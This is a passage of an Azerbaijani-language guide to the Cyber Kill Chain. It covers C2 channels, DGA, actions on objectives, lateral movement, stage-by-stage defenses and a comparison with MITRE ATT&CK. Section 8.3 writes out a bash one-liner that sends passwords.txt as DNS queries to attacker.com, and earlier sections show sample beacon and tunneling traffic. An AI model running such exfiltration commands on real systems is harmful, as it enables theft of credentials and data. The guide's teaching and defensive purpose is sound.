Hücumçular C2 trafikinin normal şəbəkə trafikinə qarışmasını və təhlükəsizlik cihazları tərəfindən fərq edilməməsini istəyir. Bu səbəbdən adətən korporativ şəbəkələrdə icazə verilən protokollardan istifadə edirlər.

**1. HTTP / HTTPS (Veb Trafiki)**

Ən geniş yayılmış üsul. Zərərli proqram hücumçunun serverinə (C2 Serverinə) müntəzəm olaraq HTTP sorğuları göndərir. Bu sorğular istifadəçinin veb-səhifələrə baxışı kimi görünür.

**C2 Trafiki Nümunəsi (Beaconing):**

Zərərli proqram hər 60 saniyədə bir hücumçunun serverinə "görəcək iş varmı?" deyə soruşur.

Sorğu (Bot → C2):

```http
GET /search?q=news&id=a1b2c3d4 HTTP/1.1
Host: cdn-news-updates.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
```

> `id=a1b2c3d4` ələ keçirilmiş maşının kimliğidir. Domen (`cdn-news-updates.com`) hücumçu tərəfindən idarə edilir lakin günahsız görünür.

Cavab (C2 → Bot):

```http
HTTP/1.1 200 OK
Content-Type: text/html
Set-Cookie: session=Base64EncodedCommand...

<html>...</html>
```

**2. DNS Tunneling**

Təşkilatlar adətən veb trafikini filtrləyir lakin DNS sorğularına daha az məhdudiyyət qoyur. Hücumçular məlumatları DNS sorğularının içinə gizlədərək xaricə göndərir.

**Məntiqi:**
Zərərli proqram exfiltrasiya etmək istədiyi məlumatı (məsələn, `password123`) alt domen kimi kodlayaraq sorğulayır:

```
password123.attacker.com
```

DNS serveri bu sorğunu həll edə bilmir və `attacker.com` üçün səlahiyyətli ad serverinə ötürür (bu server hücumçudur). Hücumçu bu sorğunu gördükdə məlumatı almış olur.

**3. Digər Protokollar**

| Protokol | İstifadə Üsulu |
|----------|----------------|
| **ICMP** | Ping paketlərinin içinə məlumat gizlətmək |
| **FTP / SMTP** | Fayl köçürmə və ya poçt protokollarından istifadə |
| **Sosial Media / Bulud Xidmətləri** | Twitter yazıları, Google Drive faylları və ya Telegram mesajlarında C2 əmrlərini gizlətmək |

---

### 7.2 Beaconing və Jitter

| Konsept | İzah |
|---------|------|
| **Beaconing** | Zərərli proqramın C2 serverinə dövri qoşulması |
| **Müntəzəm Beacon** | Tam olaraq hər 60 saniyədə qoşulur. SIEM sistemləri tərəfindən riyazi analizlə asanlıqla aşkarlana bilər. |
| **Jitter** | Aşkarlanmanı çətinləşdirmək üçün hücumçular "Jitter" əlavə edir. Məsələn, 20% Jitter olan 60 saniyelik beacon 48 ilə 72 saniyə arasında təsadüfi vaxtda qoşulur. |

---

### 7.3 Domen Yaratma Alqoritmləri (DGA — Domain Generation Algorithms)

C2 serverləri IP əsaslı bloklamaya və ya domen ləğvinə qarşı həssasdır. Bunu aşmaq üçün zərərli proqramlar DGA-dan istifadə edir:

Zərərli proqram və hücumçu eyni riyazi alqoritmdən istifadə edərək hər gün minlərlə təsadüfi domen yaradır (məsələn, `xhz123askla.com`, `qwe987poiu.com`). Hücumçu onlardan yalnız birini alıb aktivləşdirir. Zərərli proqram onları sırayla sınayır və aktiv olana qoşulduqda C2 kanalı qurulur. Müdafiəçilərin bütün mümkün domenləri blok etməsi qeyri-mümkündür.

---

### 7.4 C2 Mərhələsinin Aşkarlanması və Müdafiəsi

**Proxy və Firewall Log Analizi:**
- Naməlum və ya yeni qeydiyyatdan keçmiş domenlərə trafik
- İş saatları xaricində baş verən müntəzəm trafik (gecə saat 3)
- Uzun müddətli bağlantılar
- User-Agent anomaliyaları (məsələn, PowerShell User-Agent ilə veb girişi)

**DNS Analizi:**
- Həddindən artıq uzun alt domen sorğuları (DNS Tunneling əlaməti)
- Yüksək sayda NXDOMAIN (Tapılmadı) cavabları (DGA əlaməti)

**Təhdid Kəşfiyyatı (Threat Intelligence):**
- Məlum C2 IP ünvanlarını və domenlerini (IOC) təhlükəsizlik cihazlarına (SIEM, Firewall) inteqrasiya etmək və blok etmək.

**Şəbəkə Seqmentasiyası:**
- Kritik serverlərin birbaşa internet girişini kəsmək. C2 kanalının qurulmasının fiziki olaraq qarşısını alır.

---

## 8. Hədəflərə Qarşı Tədbirlər (Actions on Objectives)

Cyber Kill Chain-in son mərhələsi olan **Hədəflərə Qarşı Tədbirlər**, hücumçunun bütün səylərinin nəticəsini əldə etdiyi yerdir. Hücumçu artıq şəbəkənin içindədir, davamlılıq qurub, komanda mərkəzinə qoşulub və əsas məqsədini həyata keçirməyə hazırdır.

Hücumun məqsədi siyasi, maliyyə və ya hərbi ola bilər.

---

### 8.1 Mümkün Tədbirlər və Məqsədlər

**1. Məlumat Exfiltrasyonu (Data Exfiltration)**

Ən geniş yayılmış məqsəd. Həssas məlumatların (müştəri məlumatları, kredit kartları, mənbə kodları, dövlət sirləri) təşkilatdan xaricə çıxarılması.

Üsullar:
- Məlumatları şifrələmək (RAR/ZIP), parçalara bölmək və xaricə köçürmək.
- DNS Tunneling, ICMP və ya HTTPS vasitəsilə məlumat exfiltrasyonu.
- Bulud saxlama xidmətlərinə yükləmək (Dropbox, Google Drive).

**2. Şifrələmə və Fidyə (Ransomware)**

Məlumatları oğurlamaq əvəzinə (və ya oğurladıqdan sonra), hücumçu bütün sistemləri şifrələyir və deşifrə etmək üçün fidyə tələb edir (Bitcoin və s.).

- **İkiqat Söküş (Double Extortion):** Fidyə ödənilmədiyi halda məlumatları ictimaiyyətə açıqlamaqla hədə vermək.

**3. Məlumat Məhvi və Sabotaj**

Məqsəd müəssisəyə zərər verməkdirsə, hücumçular məlumatları silə (Wiper zərərli proqramı) və ya sistemləri istifadəsiz edə bilər (SCADA sistemlərinə hücumlar, disklərin formatlanması).

**4. Resurs Oğurluğu (Resource Hijacking)**

Sistemin işləmə gücündən kriptovalyuta hasilatı (Cryptomining) üçün istifadə etmək və ya sistemi digər hədəflərə DDoS hücumları həyata keçirmək üçün Botnet-in bir hissəsinə çevirmək.

**5. Məlumat Manipulyasiyası**

Məlumatların bütövlüyünü pozmaq. Məsələn, bank hesabındakı balansi dəyişdirmək və ya xəstəxanada xəstənin qan qrupunu dəyişdirmək. Bu, aşkarlanması ən çətin və potensial olaraq ən təhlükəli hücum növüdür.

---

### 8.2 Lateral Movement (Yan Hərəkat)

Adətən hücumçunun ələ keçirdiyi ilk maşın (Patient Zero — Sıfır Xəstə) əsl hədəfin (məsələn, Verilənlər Bazası Serveri) yerləşdiyi maşın deyil. Bu səbəbdən hücumçu şəbəkə daxilindəki digər maşınlara keçməlidir. Bu prosesə **Lateral Movement** deyilir.

İstifadə edilən texnikalar:

| Texnika | İzah |
|---------|------|
| **Pass the Hash** | İstifadəçinin şifrəsini bilmədən yaddaşdakı şifrə həşi (NTLM Hash) ilə autentifikasiya etmək |
| **RDP / SSH** | Ələ keçirilmiş şifrələrlə digər serverlərə uzaqdan qoşulmaq |
| **WMI / PowerShell Remoting** | Windows idarəetmə alətlərindən istifadə edərək digər maşınlarda əmrlər icra etmək |

---

### 8.3 Tədbirlərin Analizi: DNS vasitəsilə Məlumat Exfiltrasyonu Nümunəsi

Hücumçu həssas məlumatları `passwords.txt` faylında topladı. Onu DNS vasitəsilə exfiltrasiya etmək istəyir:

```bash
# Məlumatı Hex formatına çevirin və hər sətri DNS sorğusu kimi göndərin
for line in $(cat passwords.txt | xxd -p); do nslookup $line.attacker.com; done
```

> Bu əmr fayl içindəki məlumatı parçalar halında `attacker.com` serverinə DNS sorğuları kimi göndərir. Hücumçu bu log-ları öz DNS servərində birləşdirərək faylı yenidən qurur.

---

### 8.4 Aşkarlama və Müdafiə

Hücumçu bu mərhələyə çatıbsa, "müdafiə xətti sınıb" deməkdir. Lakin ziyan hələ minimuma endirilə bilər:

| Mexanizm | İzah |
|----------|------|
| **DLP (Data Loss Prevention)** | Həssas məlumatların (Şəxsiyyət nömrələri, Kredit Kartları) şəbəkədən çıxışını izləyən və blok edən sistemlər |
| **Anomali Aşkarlanması (UEBA)** | İstifadəçinin normal olaraq daxil olmadığı fayllara girişi; Gecə yarısında yüksək məlumat köçürməsi; Qısa müddətdə çoxlu fayl adının dəyişdirilməsi (Ransomware əlaməti) |
| **Şəbəkə Seqmentasiyası** | Serverlər arasında lazımsız girişi məhdudlaşdıraraq Lateral Movement-i çətinləşdirmək |
| **Yedəkləmə (Backup)** | Ransomware hücumlarına qarşı ən effektiv müdafiə oflayn və aktual yedəkləmələrin mövcud olmasıdır |

---

## 9. Müdafiə və Aşkarlama Mexanizmləri

Cyber Kill Chain modelinin ən böyük güclü cəhəti müdafiəçilərə hücumun hər mərhələsini dayandırmaq və ya aşkarlamaq imkanı verməsidir.

### 9.1 Müdafiə Matrisi (6D)

| Hərəkət | İzah |
|---------|------|
| **Detect (Aşkarla)** | Hücumçunun varlığını görmək |
| **Deny (İnkar Et)** | Hücumun baş verməsinin qarşısını almaq |
| **Disrupt (Pozunt)** | Hücum axınını kəsmək və ya dayandırmaq |
| **Degrade (Zəiflət)** | Hücumun təsirini və ya sürətini azaltmaq |
| **Deceive (Aldatma)** | Hücumçunu yanlış istiqamətə yönəltmək (Honeypot) |
| **Destroy/Contain** | Sistemin izolyasiyası (Hüquqi məhdudiyyətlər səbəbi ilə əks-hücum nadir istifadə olunur) |

---

### 9.2 Mərhələ Üzrə Müdafiə Strategiyaları

| Mərhələ | Detect | Deny | Digər |
|---------|--------|------|-------|
| **Kəşfiyyat** | Veb log analizi (scanner User-Agents), Nmap tarama imzaları | Firewall qaydaları, lazımsız xidmətlərin bağlanması | Deceive: Saxta banner məlumatları göstərmək |
| **Silahlandırma** | Yoxdur (Hücumçunun tərəfində baş verir) | — | Zərərli proqramı analiz edərək IoC-lar yaratmaq |
| **Çatdırılma** | E-poçt Gateway analizləri, istifadəçi hesabatları | SPF/DKIM/DMARC, zərərli əlavələri blok etmək, URL filtrləmə | İstifadəçi maarifləndirmə təlimi |
| **İstismar** | EDR alarmları, WAF logları | Yamaq idarəetməsi, ASLR/DEP, Təhlükəsiz kodlaşdırma | Köhnə ƏS-ləri şəbəkədən izolyasiya etmək |
| **Quraşdırma** | FIM, Registry dəyişiklik alarmları | Ən az imtiyaz (Least Privilege), AppLocker | Zərərli prosesləri dayandırmaq |
| **C2** | DNS trafik analizi, Proxy loglarında şübhəli IP-lər, Beaconing analizi | DNS Sinkhole, Egress filtrləmə | Hücumçunun C2 trafikini Honeypot-a yönləndirmək |
| **Hədəflərə Tədbirlər** | DLP alarmları, UEBA | Məlumat şifrələməsi, Şəbəkə seqmentasiyası | Təsirlənmiş sistemləri şəbəkədən ayırmaq |

---

### 9.3 Aşkarlama üçün Kritik Məlumat Mənbələri

| Log Mənbəyi | Əlaqəli Kill Chain Mərhələsi | Nümunə Aşkarlama |
|-------------|------------------------------|------------------|
| **Veb Proxy / Firewall** | Çatdırılma, C2 | Zərərli domen ziyarəti, C2 beaconing |
| **E-poçt Gateway** | Çatdırılma | Phishing poçtu, zərərli əlavə |
| **EDR / Antivirus** | İstismar, Quraşdırma | Yaddaş daşması, Registry dəyişikliyi |
| **DNS Serveri** | Kəşfiyyat, Çatdırılma, C2, Tədbirlər | DGA domenləri, DNS Tunneling |
| **Active Directory** | Kəşfiyyat, Tədbirlər | Brute Force, Pass the Hash, İmtiyaz artırımı |

---

### 9.4 Kompromis Göstəriciləri (IoC — Indicators of Compromise)

Hər hücum arxasında izlər buraxır. Bu izlərə **IoC** deyilir:

| IoC Növü | Nümunə |
|----------|--------|
| **Hash** | Zərərli faylın MD5/SHA256 özeti |
| **IP Ünvanı** | C2 serverinin və ya hücumçunun IP-si |
| **Domen** | Phishing və ya C2 domeni |
| **Şəbəkə/Host Artefaktları** | Registry açarı, fayl adı, Mutex dəyəri |

Müdafiəçilər aşkarlanan bu IoC-ları təhlükəsizlik cihazlarına (SIEM, Firewall) daxil edərək avtomatik bloklanmanı təmin edirlər.

---

## 10. Cyber Kill Chain vs MITRE ATT&CK

Kibertəhlükəsizlik əməliyyatlarında ən çox istifadə edilən iki model **Lockheed Martin Cyber Kill Chain** və **MITRE ATT&CK** çərçivələridir. Hər ikisi hücumları başa düşmək üçün istifadə edilir, lakin yanaşmaları və detal səviyyələri fərqlidir.

---

### 10.1 Müqayisə Cədvəli

| Xüsusiyyət | Cyber Kill Chain | MITRE ATT&CK |
|------------|-----------------|--------------|
| **Quruluş** | 7 Xətti Mərhələ | Matris (Taktika və Texnikalar) |
| **Fokus** | Yüksək səviyyəli proses və profilaktika | Davranış texnikaları və aşkarlama |
| **Əhatə dairəsi** | Xaricdən sızmaq (Perimetr) | Sızma sonrası daxili hərəkatlar (Post-Exploitation) |
| **Elastiklik** | Sərt və ardıcıl | Modular və ardıcıl olmayan |
| **Məqsəd** | Strateji müdafiə planlaması | Taktiki analiz və Threat Hunting |

---

### 10.2 MITRE ATT&CK nədir?

**MITRE ATT&CK** (Adversarial Tactics, Techniques, and Common Knowledge) real dünya müşahidələrinə əsaslanan düşmən davranışlarının qlobal bilik bazasıdır.

- **Taktikalar:** Hücumçunun məqsədi (NİYƏ?). Məsələn, İlkin Giriş, Davamlılıq.
- **Texnikalar:** Hücumçunun məqsədinə necə nail olduğu (NECƏ?). Məsələn, Phishing, Registry Run Açarları.
- **Prosedurlar:** Konkret icra detalları (APT28 qrupu bu texnikadan bu cür istifadə edir).

---

### 10.3 Vahid Yanaşma

Müasir SOC bu iki modeli bir-birini tamamlayacaq şəkildə istifadə etməlidir:

**Strateji Görüş (Cyber Kill Chain):**
İcraçılar və CISO səviyyəsi üçün uyğundur. "Hücumu hansı mərhələdə dayandırdıq?" sualına sadə cavab verir.

*Nümunə Hesabat:* "Keçən ay 50 hücumu Çatdırılma mərhələsində, 2 hücumu isə C2 mərhələsində blok etdik."

**Əməliyyat/Taktiki Görüş (MITRE ATT&CK):**
Analitiklər, Threat Hunter-lər və Hadisəyə Müdaxilə Mütəxəssisləri üçün uyğundur.

*Nümunə Analiz:* "Hücumçu İlkin Giriş taktikası üçün 'T1566 Phishing' texnikasından, sonra İmtiyaz Artırımı üçün 'T1055 Proses İnjeksiyası' texnikasından istifadə etdi."

---

### 10.4 Xəritələmə Nümunəsi

| Cyber Kill Chain Mərhələsi | MITRE ATT&CK Taktikası |
|---------------------------|------------------------|
| Kəşfiyyat | Reconnaissance / Resource Development |
| Silahlandırma | Resource Development |
| Çatdırılma | Initial Access |
| İstismar | Execution |
| Quraşdırma | Persistence / Defense Evasion |
| Komanda & İdarəetmə | Command and Control |
| Hədəflərə Tədbirlər | Exfiltration / Impact / Collection |

---

### 10.5 Vahid Kill Chain (Unified Kill Chain)

Cyber Kill Chain-in müasir hücumları (xüsusilə bulud və insayder təhdidlərini) əhatə etməkdə çatışmazlığı və "xətti" quruluşuna görə tənqidlər səbəbindən **Paul Pols** tərəfindən **Vahid Kill Chain** modeli hazırlanmışdır. Bu model MITRE ATT&CK və Cyber Kill Chain-i birləşdirərək daha hərtərəfli **18 mərhələli dövrə** təklif edir.

Vahid Kill Chain hücumu üç əsas fazaya bölür:

| Faza | İzah |
|------|------|
| **In (Giriş)** | Hədəf sistemə giriş əldə etmək |
| **Through (Keçid)** | İmtiyaz artırımı və şəbəkə daxilində yayılmaq |
| **Out (Çıxış)** | Məqsədə nail olmaq və izləri silmək |

---

### 10.6 Nəticə

Kibertəhlükəsizlikdə "tək doğru model" yoxdur.

- **Cyber Kill Chain** müdafiə arxitekturası qurmaq üçün əla bir təməldir ("Dərinliyinə müdafiə qurmalıyıq").
- **MITRE ATT&CK** isə bu arxitekturadakı boşluqları tapmaq və hücumçu davranışlarını ətraflı analiz etmək üçün əvəzolunmaz bir ensiklopediyadır.

Peşəkar analitik hər iki modeli mənimsəməlidir.

---

*© Cyber Kill Chain — Azərbaycanca Tam Bələdçi | Kibertəhlükəsizlik Laboratoriyası üçün hazırlanmışdır*
